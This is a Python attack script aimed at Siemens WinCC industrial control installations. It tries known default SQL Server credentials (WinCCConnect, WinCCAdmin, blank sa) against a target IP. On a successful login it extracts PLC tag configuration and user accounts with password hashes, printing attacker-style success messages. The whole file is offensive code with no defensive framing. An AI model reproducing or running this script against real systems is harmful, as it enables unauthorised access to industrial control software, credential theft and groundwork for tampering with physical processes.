def wincc_default_credentials():
    """
    WinCC uses SQL Server with known default credentials
    """
    default_creds = {
        "WinCCConnect": "2WSXcder",
        "WinCCAdmin": "2WSXcder",
        "sa": ""  # Often blank in default installations
    }

    return default_creds

def wincc_sql_connect(target_ip):
    """
    Connect to WinCC SQL Server database
    Extract tag configuration, alarm limits, user accounts
    """
    import pymssql

    creds = wincc_default_credentials()

    for username, password in creds.items():
        try:
            conn = pymssql.connect(
                server=target_ip,
                user=username,
                password=password,
                database='CC_OS_1_1553_15_10_12_R'  # Default WinCC DB name
            )

            print(f"[+] Connected with {username}:{password}")

            cursor = conn.cursor()

            # Extract tag database
            cursor.execute("SELECT * FROM PLC_TAGS")
            tags = cursor.fetchall()

            print(f"[*] Found {len(tags)} tags")
            for tag in tags[:10]:  # Print first 10
                print(f"    {tag}")

            # Extract user accounts
            cursor.execute("SELECT * FROM PLC_USERS")
            users = cursor.fetchall()

            print(f"\n[*] Found {len(users)} users")
            for user in users:
                print(f"    Username: {user[0]}, Password Hash: {user[1]}")

            conn.close()
            return True

        except Exception as e:
            print(f"[-] Failed with {username}: {e}")

    return False

# wincc_sql_connect('192.168.1.100')
